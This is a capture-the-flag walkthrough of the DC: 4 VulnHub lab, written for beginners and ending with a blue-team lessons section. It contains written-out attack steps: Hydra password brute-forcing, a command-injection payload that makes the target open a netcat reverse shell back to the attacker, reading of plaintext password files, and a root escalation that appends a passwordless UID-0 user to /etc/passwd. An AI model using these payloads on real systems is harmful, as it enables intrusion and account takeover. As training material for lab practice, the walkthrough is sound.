# DC: 4 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 4 is the fourth machine in the DCAU "DC" series. It is a purposely broken Debian
virtual machine. The whole point is to practice the full penetration-testing cycle:
find the box, enumerate it, break in, move sideways, escalate to root, and read the
flag. This document explains every step as if you have never opened a terminal before.

| Field | Value |
|---|---|
| Machine | DC: 4 |
| Difficulty | Beginner / Intermediate |
| Author | DCAU (http://www.five86.com/dc-4.html) |
| Released | 7 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-4,313/ |
| Download | https://vulnhub.com/entry/dc-4,313/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 32-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery** — finding a hidden machine on your network with `netdiscover`/`nmap`.
- **Service enumeration** — identifying a web server and an SSH service.
- **Brute-forcing a web login** — using Hydra and Burp Suite Intruder with a wordlist.
- **Command injection** — making a web page run operating-system commands for you.
- **Reverse shells** — making the target connect back to you so you get an interactive shell.
- **Credential reuse / lateral movement** — reading a password backup file and a mailbox.
- **SUID / sudo abuse** — turning an innocent-looking `sudo` rule into a root shell.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: a chain is only as strong as each of its links. DC: 4 gives you four
links (weak password, command injection, exposed credentials, bad sudo rule).

## 1. Reconnaissance — finding the target

First, confirm your own IP address. Your Kali box is the "attacker" at
`192.168.56.10`; the target will be `192.168.56.101`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now scan the network for live hosts. `netdiscover` listens for ARP replies, which is a
fast way to find machines that are awake.

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  PCS Systemtechnik GmbH
 192.168.56.10   0a:00:27:00:00:01      1      60  PCS Systemtechnik GmbH
 192.168.56.101  0a:00:27:00:00:02      1      60  PCS Systemtechnik GmbH
```

`192.168.56.101` is our target. (MAC addresses and counts vary by build.)

![Netdiscover output showing the target host](images/01-netdiscover.png)

> **Why it works:** ARP is how devices ask "who has this IP?" on a local network. An
> attacker on the same layer-2 segment can listen to every reply and map the network
> without sending a single packet to the target itself. This is passive-ish recon.

## 2. Enumeration

Now find out what services the target is offering. `nmap` probes each port.

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    nginx 1.15.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: SSH on 22 and a web server on 80. (Exact versions vary by build.)

![Full nmap scan of DC-4](images/02-nmap.png)

Open the web server in a browser, or with `curl`.

```bash
curl -i http://192.168.56.101/
```

```text
HTTP/1.1 200 OK
Server: nginx/1.15.10
Content-Type: text/html

<html>...
  <title>DC-4</title>
  ... a login form with `username` and `password` fields ...
</html>
```

An admin login page. Let's also look for hidden paths.

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

```text
/images               (Status: 301)
/index.php            (Status: 200)
/login.php            (Status: 200)
/logout.php           (Status: 302)
```

## 3. Foothold

### 3.1 Cracking the login

The login form is the first weak link. Try squashing obvious credentials first, then
brute-force with Hydra. DC: 4 reuses a password that appears in common wordlists.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Logout"
```

```text
[80][http-post-form] host: 192.168.56.101  login: admin  password: happy
1 of 1 target successfully completed, 1 valid password found
```

Credentials: **admin : happy**. (The exact password depends on the build/wordlist, but
`happy` is the classic answer for this box.)

![Successful login as admin](images/03-login.png)

> **Why it works:** A wordlist attack is just trying many passwords quickly. If a user
> picks a dictionary word, the server will eventually say "yes". The `S=Logout` string
> tells Hydra that a response containing "Logout" means the login succeeded.

### 3.2 Command injection

After logging in, there is a diagnostic page that runs a "command" for you — it lists
files. It is a classic command-injection sink.

Navigate to `http://192.168.56.101/command.php` (or click "Command"). The page lets you
"Prepare for an attack" and choose a `radio` option like `ls -l`. Intercept the request
with Burp Suite and send it to Repeater.

Original request body:

```text
radio=ls+-l&submit=Run
```

Replace the value with a reverse shell. Start a listener first on your Kali box.

```bash
rlwrap nc -lvnp 1234
```

Then swap the `radio` value to make the server call back to you:

```text
radio=nc+-e+/bin/sh+192.168.56.10+1234&submit=Run
```

```text
listening on [any] 1234 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 58892
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You are now the web user `www-data`. Upgrade your dumb shell to a full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/04-reverse-shell.png)

> **Why it works:** The web app builds a shell command by pasting your input directly
> into a command string. When your input contains shell metacharacters, the shell runs
> *your* command instead of the intended one. Here the app effectively ran
> `nc -e /bin/sh <attacker> <port>`, handing you a shell.

### 3.3 Lateral movement to `jim`

Look around `www-data`'s reachable files. A backup of old passwords is exposed.

```bash
ls -la /home/jim/backups
cat /home/jim/backups/old-passwords.bak
```

```text
... 123456
... jibril04
... password
... happy
```

Serve the file or just copy the list, then brute-force SSH for `jim` with Hydra.

```bash
hydra -l jim -P old-passwords.bak 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101  login: jim  password: jibril04
```

Log in properly over SSH for a stable shell:

```bash
ssh jim@192.168.56.101
```

```text
You have mail.
jim@dc-4:~$
```

![SSH login as jim with the new-mail banner](images/05-ssh-jim.png)

> **Why it works:** `old-passwords.bak` leaks a plaintext list of historical passwords.
> People reuse passwords, so an old password is often a current one. Hydra simply tests
> each entry against the real SSH service.

### 3.4 Reading the mail

That "You have mail" banner is a huge hint. Unix keeps a user's mail in `/var/mail`.

```bash
cat /var/mail/jim
```

```text
From: charles
To: jim
Subject: Password change

Hi Jim, here is the new password for my account: ^xHhA&hvim0y
```

Credentials: **charles : ^xHhA&hvim0y**.

## 4. Privilege escalation

### 4.1 Check sudo rights

Switch to `charles` and see what he is allowed to run as root.

```bash
su charles
Password: ^xHhA&hvim0y
sudo -l
```

```text
User charles may run the following command on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

`teehee` is a custom binary that behaves like `tee`: it copies input to a file, and with
`-a` it appends. Because it runs as root, it can write anywhere — including `/etc/passwd`.

### 4.2 Adding a root user

Append a line that creates a new user with UID 0 (the root user ID) and no password.

```bash
echo "cyber::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

Then switch to the user you just created — no password required because the field is empty.

```bash
su cyber
whoami
```

```text
root
```

Read the flag:

```bash
cd /root
cat flag.txt
```

```text
Congratulations! You have found the flag.
```

![Root shell and the flag](images/06-root-flag.png)

> **Why it works:** On Linux, the file `/etc/passwd` defines user accounts by their
> numeric UID. A user with UID `0` *is* root, regardless of the name. The sudo rule let
> `charles` run `teehee` as root, and `teehee -a` appended attacker-controlled text to a
> root-owned file. The empty password field (`::`) means `su` asks for nothing.

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Weak / guessable admin password | Web login (`admin:happy`) | Full admin access to the app | Strong password policy + MFA |
| 2 | OS command injection | "Command" diagnostic page (`radio` param) | Remote code execution as `www-data` | Never pass user input to a shell; use allow-lists |
| 3 | Sensitive file exposure | `backups/old-passwords.bak` readable | Password reuse → SSH login as `jim` | Remove backups; store secrets encrypted |
| 4 | Credentials in plaintext mail | `/var/mail/jim` | Account takeover (`charles`) | Never email plaintext passwords |
| 5 | Unsafe sudo binary | `sudo -l` → `NOPASSWD: /usr/bin/teehee` | Root via `/etc/passwd` rewrite | Least privilege; audit custom setuid/sudo tools |

## 6. Defensive lessons (blue team)

- **Treat every input as hostile.** Command injection exists because user text reached a
  shell. Use parameterised APIs, never `system()`/`popen()` with raw input, and validate
  against an allow-list.
- **Passwords are not secrets if you write them down.** Backups and mail spools are
  attacker gold. Store hashes, use a secrets manager, and never email credentials.
- **Reuse turns one leak into many.** Randomise per-service credentials; rotate immediately.
- **Audit `sudo -l` and SUID binaries regularly.** Any binary that writes files or spawns
  a shell when run as root is a privilege-escalation primitive (see GTFOBins).
- **Detect the attack.** A reverse shell appears as an outbound connection from the web
  server to an unusual host. Alert on it. Log and rate-limit login failures.
- **Segment networks.** A web server should not be able to reach your workstation's
  arbitrary ports; egress filtering blocks the callback.

## 7. References

- VulnHub entry — https://vulnhub.com/entry/dc-4,313/
- DCAU series home — http://www.five86.com/dc-4.html
- GTFOBins (sudo/SUID abuses) — https://gtfobins.github.io/
- Hydra documentation — https://github.com/vanhauser-thc/thc-hydra
- OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection
- reverse-shell / revshells generator — https://www.revshells.com/
- Exploit-DB (general) — https://www.exploit-db.com/

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan (ports 22 and 80)
- [ ] `images/03-login.png` — successful `admin:happy` web login
- [ ] `images/04-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/05-ssh-jim.png` — SSH login as `jim` with mail banner
- [ ] `images/06-root-flag.png` — root shell and `flag.txt` contents
